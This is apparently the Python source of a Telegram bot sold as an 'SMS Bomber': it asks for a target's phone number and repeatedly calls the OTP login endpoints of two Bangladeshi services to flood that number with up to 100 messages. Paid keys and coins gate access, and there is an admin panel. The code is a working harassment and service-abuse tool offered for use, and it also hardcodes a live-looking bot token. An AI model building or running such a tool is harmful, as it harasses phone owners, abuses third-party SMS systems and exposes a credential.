import telebot
import requests
import json
import os
import time
import threading
import random
from telebot import types

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 6363065063 
LOG_CHANNEL = "@sMsBotManagerDUModz" 
REQUIRED_CHANNEL = "@DemoTestDUModz" 
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ডাটাবেস ফাংশন ---
def load_db(file):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump({}, f)
        return {}
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return {}

def save_db(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=4)

# গ্লোবাল ডাটাবেস
users = load_db('users.json')
keys = load_db('keys.json')

# --- ভেরিফিকেশন চেক ---
def is_joined(user_id):
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except:
        return False

# --- ইউআই এলিমেন্টস ---
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Attack SMS", callback_data="bomb"),
        types.InlineKeyboardButton("👤 My Profile", callback_data="profile"),
        types.InlineKeyboardButton("🔑 Use Key", callback_data="recharge"),
        types.InlineKeyboardButton("📢 Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}")
    )
    return markup

def send_welcome(chat_id, name):
    msg = bot.send_message(chat_id, "⚙️ **Initializing System...**")
    time.sleep(0.5)
    bot.edit_message_text("🔓 **Access Granted!**", chat_id, msg.message_id)
    time.sleep(0.5)
    bot.delete_message(chat_id, msg.message_id)
    
    caption = (f"👋 **Hello, {name}!**\n\n"
               f"Welcome to **DU ModZ SMS Bomber**.\n"
               f"Status: `Premium Activated ✅`\n"
               f"Speed: `Extreme ⚡`\n\n"
               f"Choose an option below:")
    bot.send_photo(chat_id, LOGO_URL, caption=caption, reply_markup=main_menu())

# --- হ্যান্ডলারস ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    if uid not in users:
        users[uid] = {"coins": 50, "status": "active", "sent": 0}
        save_db('users.json', users)
        bot.send_message(LOG_CHANNEL, f"🆕 **New User:** `{uid}`")

    if is_joined(message.from_user.id):
        send_welcome(message.chat.id, message.from_user.first_name)
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}"))
        markup.add(types.InlineKeyboardButton("✅ Check Joined", callback_data="verify"))
        bot.send_message(message.chat.id, "❌ **Access Denied!**\n\nPlease join our channel first to use this bot.", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    uid = str(call.from_user.id)
    
    if call.data == "verify":
        if is_joined(call.from_user.id):
            bot.answer_callback_query(call.id, "✅ Verified!")
            bot.delete_message(call.message.chat.id, call.message.message_id)
            send_welcome(call.message.chat.id, call.from_user.first_name)
        else:
            bot.answer_callback_query(call.id, "⚠️ Join first!", show_alert=True)

    elif call.data == "profile":
        u = users.get(uid, {})
        text = (f"👤 **User Profile**\n"
                f"━━━━━━━━━━━━━━\n"
                f"💰 Balance: `{u.get('coins', 0)}` Coins\n"
                f"📊 Total Sent: `{u.get('sent', 0)}` SMS\n"
                f"👑 Rank: `{u.get('status', 'active').upper()}`")
        bot.send_message(call.message.chat.id, text)

    elif call.data == "recharge":
        msg = bot.send_message(call.message.chat.id, "🔑 **Send your Recharge Key:**")
        bot.register_next_step_handler(msg, process_key)

    elif call.data == "bomb":
        if users.get(uid, {}).get('status') == "blocked":
            bot.send_message(call.message.chat.id, "🚫 You are blocked by admin.")
            return
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number (11 digits):**")
        bot.register_next_step_handler(msg, get_num)

# --- এসএমএস ইঞ্জিন ---
def get_num(message):
    num = message.text
    if len(num) == 11 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **Enter SMS Amount (Max 100):**")
        bot.register_next_step_handler(msg, lambda m: start_bombing(m, num))
    else:
        bot.send_message(message.chat.id, "❌ Invalid Number!")

def start_bombing(message, num):
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        uid = str(message.from_user.id)
        cost = amount * 2 # প্রতি এসএমএস ২ কয়েন
        
        if users[uid]['status'] != 'lifetime' and users[uid]['coins'] < cost:
            bot.send_message(message.chat.id, f"⚠️ Low balance! Need {cost} coins.")
            return
            
        progress_msg = bot.send_message(message.chat.id, f"🚀 **Attack Started on {num}...**\n[░░░░░░░░░░] 0%")
        threading.Thread(target=execute_bombing, args=(uid, num, amount, cost, progress_msg)).start()
    except:
        bot.send_message(message.chat.id, "❌ Error in input!")

def execute_bombing(uid, num, amount, cost, msg):
    # API List (Bioscope, etc)
    urls = [
        "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        "https://bikroy.com/data/relative/login-with-otp"
    ]
    
    success = 0
    for i in range(1, amount + 1):
        try:
            # API Call Logic
            payload = {"number": "+88" + num} if "bioscope" in urls[0] else {"phone": num}
            r = requests.post(random.choice(urls), json=payload, timeout=5)
            if r.status_code == 200:
                success += 1
            
            # অ্যানিমেশন আপডেট (প্রতি ৫টি এসএমএস পর পর)
            if i % 5 == 0 or i == amount:
                percent = int((i/amount)*100)
                bar = "█" * (percent // 10) + "░" * (10 - (percent // 10))
                bot.edit_message_text(f"🚀 **Attacking {num}...**\n[{bar}] {percent}%", msg.chat.id, msg.message_id)
            
            time.sleep(0.5)
        except: pass

    # কয়েন কাটা ও ডাটা সেভ
    if users[uid]['status'] != 'lifetime':
        users[uid]['coins'] -= cost
    users[uid]['sent'] += success
    save_db('users.json', users)

    # ফাইনাল মেসেজ
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔄 Attack Again", callback_data="bomb"))
    bot.edit_message_text(f"✅ **Attack Finished!**\n\n🎯 Target: `{num}`\n🚀 Sent: `{success}`\n💰 Cost: `{cost if users[uid]['status'] != 'lifetime' else 0}` coins\n\nPowered by @DemoTestDUModz", msg.chat.id, msg.message_id, reply_markup=markup)

# --- কি প্রসেসিং ---
def process_key(message):
    key = message.text.strip()
    uid = str(message.from_user.id)
    if key in keys:
        val = keys[key]
        if val == "lifetime":
            users[uid]['status'] = "lifetime"
        else:
            users[uid]['coins'] += int(val)
        
        del keys[key]
        save_db('keys.json', keys)
        save_db('users.json', users)
        bot.send_message(message.chat.id, "🎉 **Congratulations!** Key redeemed successfully.")
    else:
        bot.send_message(message.chat.id, "❌ **Invalid or Expired Key!**")

# --- অ্যাডমিন কমান্ডস ---
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 Stats", callback_data="adm_stats"),
        types.InlineKeyboardButton("🔑 Gen Key", callback_data="adm_gen"),
        types.InlineKeyboardButton("📢 Broadcast", callback_data="adm_bc")
    )
    bot.send_message(message.chat.id, "👨‍✈️ **Admin Control Panel**", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
def admin_callback(call):
    if call.from_user.id != ADMIN_ID: return
    
    if call.data == "adm_stats":
        total_u = len(users)
        total_k = len(keys)
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"📊 **System Stats:**\nTotal Users: {total_u}\nPending Keys: {total_k}")

    elif call.data == "adm_gen":
        msg = bot.send_message(call.message.chat.id, "Enter amount (e.g. 500 or lifetime):")
        bot.register_next_step_handler(msg, admin_gen_key)

def admin_gen_key(message):
    val = message.text
    new_key = "DU-" + os.urandom(3).hex().upper()
    keys[new_key] = val
    save_db('keys.json', keys)
    bot.reply_to(message, f"🔑 **Key Generated:** `{new_key}`\nValue: `{val}`")

# --- বোট চালানো ---
if __name__ == "__main__":
    print("DU ModZ Bot is Online...")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=30)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
